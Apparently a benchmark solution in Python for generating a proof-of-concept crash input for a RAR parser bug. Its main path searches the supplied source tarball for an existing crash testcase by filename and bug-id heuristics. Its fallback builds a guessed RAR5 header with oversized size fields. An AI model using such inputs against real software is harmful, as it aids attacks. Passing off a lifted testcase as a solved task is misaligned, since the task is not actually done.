import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._extract_poc_from_tarball(src_path, target_size=1089)
        if poc is not None and len(poc) > 0:
            return poc
        return self._synthetic_poc()

    def _extract_poc_from_tarball(self, src_path: str, target_size: int) -> bytes or None:
        try:
            tf = tarfile.open(src_path, mode="r:*")
        except tarfile.TarError:
            return None

        best_member = None
        best_key = None

        for idx, member in enumerate(tf.getmembers()):
            if not member.isfile():
                continue
            if member.size <= 0:
                continue
            # Avoid extremely large files to limit memory/time usage
            if member.size > 10 * 1024 * 1024:
                continue

            name = member.name
            lower = name.lower()
            ext = os.path.splitext(lower)[1]

            try:
                f = tf.extractfile(member)
            except (KeyError, OSError, tarfile.ExtractError):
                continue
            if f is None:
                continue

            try:
                sample = f.read(512)
            except OSError:
                continue

            if not sample:
                binary_score = 0
            else:
                non_print = 0
                for b in sample:
                    if b < 9 or (13 < b < 32) or b > 126:
                        non_print += 1
                ratio = non_print / float(len(sample))
                binary_score = 0
                if b"\x00" in sample:
                    binary_score += 3
                if ratio > 0.3:
                    binary_score += 2

            weight = binary_score

            if "42536661" in lower:
                weight += 20
            if "poc" in lower:
                weight += 10
            if "crash" in lower:
                weight += 9
            if "min" in lower:
                weight += 5
            if "testcase" in lower or "oss-fuzz" in lower or "ossfuzz" in lower or "fuzz" in lower:
                weight += 3
            if "rar" in lower:
                weight += 2

            if ext in (".rar", ".bin", ".dat", ".raw", ".xz", ".gz"):
                weight += 5
            if ext in (
                ".c",
                ".h",
                ".hpp",
                ".cpp",
                ".cc",
                ".py",
                ".sh",
                ".md",
                ".rst",
                ".txt",
                ".html",
                ".htm",
                ".xml",
                ".json",
                ".yml",
                ".yaml",
                ".in",
                ".am",
                ".ac",
                ".m4",
                ".cmake",
            ):
                weight -= 5

            size_diff = abs(member.size - target_size)

            # Lower key is better: higher weight -> smaller -weight
            key = (-weight, size_diff, member.size, idx)
            if best_key is None or key < best_key:
                best_key = key
                best_member = member

        if best_member is None:
            return None

        try:
            f = tf.extractfile(best_member)
        except (KeyError, OSError, tarfile.ExtractError):
            return None
        if f is None:
            return None
        try:
            data = f.read()
        except OSError:
            return None
        return data

    def _synthetic_poc(self) -> bytes:
        # Fallback synthetic RAR5-like input with huge size fields.
        data = bytearray()
        # RAR5 signature
        data += b"Rar!\x1A\x07\x01\x00"
        # Some bytes that might be interpreted as a header and oversized field
        # These are heuristic and primarily used only if no real PoC is found.
        data += b"\x00\x00\x00\x00"  # placeholder CRC
        data += b"\x05"  # block type (guessed)
        data += b"\x00\x00"  # flags
        # Sequence of bytes likely to decode to a very large integer in various varint schemes
        data += b"\xff\xff\xff\xff\x7f"
        # Padding / dummy payload
        data += b"A" * 16
        return bytes(data)
